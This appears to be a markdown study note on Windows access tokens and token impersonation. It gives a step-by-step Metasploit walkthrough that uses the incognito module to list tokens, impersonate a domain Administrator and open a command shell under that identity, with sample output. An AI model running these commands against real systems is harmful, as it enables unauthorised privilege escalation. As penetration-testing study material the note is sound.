
### <span style="color:#50FA7B">🔑 What is a Token?</span>
A **token** in Windows is like a **web cookie** — it temporarily grants access so a user doesn't need to re-enter credentials every time they access files or resources.
### <span style="color:#50FA7B">🧠 Types of Tokens</span>

1. **Delegate Token**
    - Created during **interactive logins**
    - Example: When you log in via **Remote Desktop (RDP)** or directly at the machine
2. **Impersonation Token**
    - Created during **non-interactive logins**
    - Example: When you map a network drive or run a logon script

The following are the privileges that are required for a successful impersonation attack

- **SeAssignPrimaryToken:** This allows a user to impersonate token
- **SeCreateToken:** This allows a user to create an arbitrary token with administrative privileges
- **SeImpersonatePrivilege:**  This allows a user to create a process under the security context of another user typically with administrative privilaeges

`token presist until a reboot. When a user logs off, their delegate token is reported as an impersonate token but will still hold all of the rights of a delegate token`
## <span style="color:#8BE9FD">**Step-by-Step Exploitation**</span>

### <span style="color:#50FA7B">**1. Get a Meterpreter Shell**</span>
First establish a foothold on the target machine.
> ⚠️ Requires Meterpreter from Metasploit
> 

### <span style="color:#50FA7B">**2. Load Incognito Module**</span>
```
use incognito
```

### <span style="color:#50FA7B">**3. List Available Tokens**</span>
- **List available tokens:** `list_tokens -u`
- Look for **delegation** or **impersonation** tokens (especially those of admin/system users)
```
list_tokens -u
```

Example output:
```
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

### <span style="color:#50FA7B">**4. Impersonate a Privileged Token**</span>
```
impersonate_token SNEAKS.IN\\Administrator
```
*Note:* Use double backslashes (**`\\`**) in the username

### <span style="color:#50FA7B">**5. Verify Your New Identity**</span>
```
getuid
```

### <span style="color:#50FA7B">**6. Get a Shell with New Privileges**</span>
```
shell
whoami
# This runs a new shell as the impersonated user.
execute -f cmd.exe -i -t
```
You should now be running as the impersonated user!


